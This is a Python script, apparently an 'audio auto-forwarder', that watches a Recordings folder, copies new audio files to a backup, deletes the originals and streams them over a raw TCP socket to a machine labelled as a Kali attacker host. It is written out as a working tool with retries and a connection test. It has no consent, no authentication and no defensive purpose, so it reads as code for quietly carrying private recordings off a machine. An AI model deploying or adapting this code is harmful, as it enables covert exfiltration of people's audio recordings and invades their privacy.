import os
import time
import socket
import sys
import shutil
from datetime import datetime
from watchdog.observers import Observer
from watchdog.events import FileSystemEventHandler

# =============== CONFIGURATION ===============
KALI_IP = '192.168.1....'  # Tumhara Kali IP
KALI_PORT = 9995

# MONITOR THIS FOLDER
MONITOR_FOLDER = os.path.expanduser("~/Downloads/Recordings")
LOCAL_BACKUP = os.path.expanduser("~/Downloads/Recordings_Backup")

# ONLY AUDIO EXTENSIONS
AUDIO_EXTENSIONS = {
    '.mp3', '.wav', '.flac', '.aac', '.ogg', 
    '.m4a', '.wma', '.aiff', '.alac', '.opus',
    '.amr', '.awb', '.mp2', '.ac3', '.dts'
}

# IGNORE THESE (System/temp files)
IGNORE_EXTENSIONS = {
    '.tmp', '.part', '.download', '.crdownload', 
    '.ini', '.cfg', '.log', '.dat', '.db'
}
# ============================================

# Create folders if not exists
os.makedirs(MONITOR_FOLDER, exist_ok=True)
os.makedirs(LOCAL_BACKUP, exist_ok=True)

print(f"[*] 📁 Monitoring: {MONITOR_FOLDER}")
print(f"[*] 💾 Local Backup: {LOCAL_BACKUP}")

def is_audio_file(filename):
    """Check if file is audio"""
    ext = os.path.splitext(filename)[1].lower()
    return ext in AUDIO_EXTENSIONS

class AudioHandler(FileSystemEventHandler):
    def on_created(self, event):
        if event.is_directory:
            return
        
        filepath = event.src_path
        filename = os.path.basename(filepath)
        
        # Ignore temp files
        ext = os.path.splitext(filename)[1].lower()
        if ext in IGNORE_EXTENSIONS:
            return
        
        # Only process audio files
        if not is_audio_file(filename):
            print(f"[*] ⏭️ Ignored: {filename} (not audio)")
            return
        
        # Wait for file to finish copying
        time.sleep(1)
        self.process_audio(filepath, filename)
    
    def on_modified(self, event):
        if event.is_directory:
            return
        
        filepath = event.src_path
        filename = os.path.basename(filepath)
        
        ext = os.path.splitext(filename)[1].lower()
        if ext in IGNORE_EXTENSIONS:
            return
        
        if not is_audio_file(filename):
            return
        
        try:
            # Check if file is complete (size stable)
            time.sleep(0.5)
            size1 = os.path.getsize(filepath)
            time.sleep(0.5)
            size2 = os.path.getsize(filepath)
            
            if size1 == size2 and size1 > 0:
                self.process_audio(filepath, filename)
        except:
            pass
    
    def process_audio(self, filepath, filename):
        """Send audio file to Kali AND move locally"""
        try:
            # Check if file exists
            if not os.path.exists(filepath):
                return
            
            # Check file size
            size = os.path.getsize(filepath)
            if size < 1024:  # Less than 1KB - ignore
                print(f"[*] ⏭️ Ignored: {filename} (too small: {size} bytes)")
                return
            
            print(f"\n[+] 🎵 Audio detected: {filename}")
            print(f"[*] 📊 Size: {size} bytes ({size/1024:.2f} KB)")
            
            # Read file
            with open(filepath, 'rb') as f:
                data = f.read()
            
            # ===== MOVE FILE TO LOCAL BACKUP =====
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            base, ext = os.path.splitext(filename)
            backup_filename = f"{base}_{timestamp}{ext}"
            backup_path = os.path.join(LOCAL_BACKUP, backup_filename)
            
            # Copy to local backup
            with open(backup_path, 'wb') as f:
                f.write(data)
            print(f"[+] 💾 Moved locally: {backup_path}")
            
            # ===== DELETE FROM MONITOR FOLDER =====
            try:
                os.remove(filepath)
                print(f"[+] 🗑️ Deleted from: {MONITOR_FOLDER}")
            except Exception as e:
                print(f"[-] ⚠️ Could not delete: {e}")
            
            # ===== SEND TO KALI =====
            print(f"[*] 🔗 Connecting to Kali: {KALI_IP}:{KALI_PORT}")
            
            retry_count = 0
            max_retries = 3
            sock = None
            
            while retry_count < max_retries:
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(30)
                    sock.connect((KALI_IP, KALI_PORT))
                    break
                except Exception as e:
                    retry_count += 1
                    print(f"[*] Retry {retry_count}/{max_retries}...")
                    if retry_count == max_retries:
                        raise
                    time.sleep(2)
            
            print(f"[+] ✅ Connected to Kali!")
            
            # Send filename
            sock.send(filename.encode())
            time.sleep(0.2)
            
            # Send file size
            sock.send(str(len(data)).encode())
            time.sleep(0.2)
            
            # Send file data in chunks
            print(f"[*] 📤 Sending {len(data)} bytes...")
            sent = 0
            chunk_size = 8192
            
            while sent < len(data):
                chunk = data[sent:sent+chunk_size]
                sock.send(chunk)
                sent += len(chunk)
                
                if sent % 10240 == 0 or sent == len(data):
                    progress = (sent / len(data) * 100)
                    print(f"\r[*] 📤 Sending: {sent}/{len(data)} bytes ({progress:.1f}%)", end='', flush=True)
            
            print()
            sock.close()
            
            print(f"[+] ✅ Audio sent to Kali: {filename}")
            print(f"[+] 📊 Total size: {len(data)} bytes ({len(data)/1024:.2f} KB)")
            print("-"*60)
            
        except ConnectionRefusedError:
            print(f"[-] ❌ Kali not listening! Start Kali receiver first!")
        except socket.timeout:
            print(f"[-] ❌ Connection TIMEOUT! Check Kali IP: {KALI_IP}")
        except Exception as e:
            print(f"[-] ❌ Error: {e}")

def main():
    print("="*60)
    print("🎵 AUDIO AUTO-FORWARDER")
    print("="*60)
    print(f"📁 Monitoring: {MONITOR_FOLDER}")
    print(f"💾 Local Backup: {LOCAL_BACKUP}")
    print(f"🎯 Forward to Kali: {KALI_IP}:{KALI_PORT}")
    print(f"📋 Audio extensions: {len(AUDIO_EXTENSIONS)} types")
    print("="*60)
    
    # Test connection first
    print("\n[*] Testing connection to Kali...")
    try:
        test_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        test_sock.settimeout(5)
        test_sock.connect((KALI_IP, KALI_PORT))
        test_sock.close()
        print("[+] ✅ Connection test PASSED!")
    except Exception as e:
        print(f"[-] ❌ Connection test FAILED: {e}")
        print("[*] Make sure Kali receiver is running!")
        print("[*] Continuing in offline mode (local backup only)...")
    
    print("\n[*] Starting monitor...")
    print("[*] Press Ctrl+C to stop")
    print("-"*60)
    
    observer = Observer()
    handler = AudioHandler()
    observer.schedule(handler, MONITOR_FOLDER, recursive=False)
    observer.start()
    
    print(f"[*] 🟢 Monitoring: {MONITOR_FOLDER}")
    print("[*] Only AUDIO files will be forwarded!")
    print("[*] Files will be MOVED (copied to backup, deleted from source)")
    print("-"*60)
    
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        observer.stop()
        print("\n[*] ⏹️ Stopping monitor...")
    observer.join()

if __name__ == "__main__":
    main()
